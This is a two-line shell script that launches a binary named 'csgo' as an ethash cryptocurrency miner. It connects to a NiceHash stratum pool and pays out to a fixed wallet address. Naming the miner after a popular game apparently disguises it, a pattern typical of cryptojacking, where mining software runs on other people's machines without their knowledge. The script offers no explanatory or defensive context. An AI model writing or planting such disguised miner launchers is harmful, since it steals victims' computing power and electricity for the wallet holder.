#!/bin/sh
./csgo -a ethash -o stratum+tcp://daggerhashimoto.usa.nicehash.com:3353 -u 3J8dAzVDbdzefaAgGHKtpJvnTPkES9iUkU -p a -w b
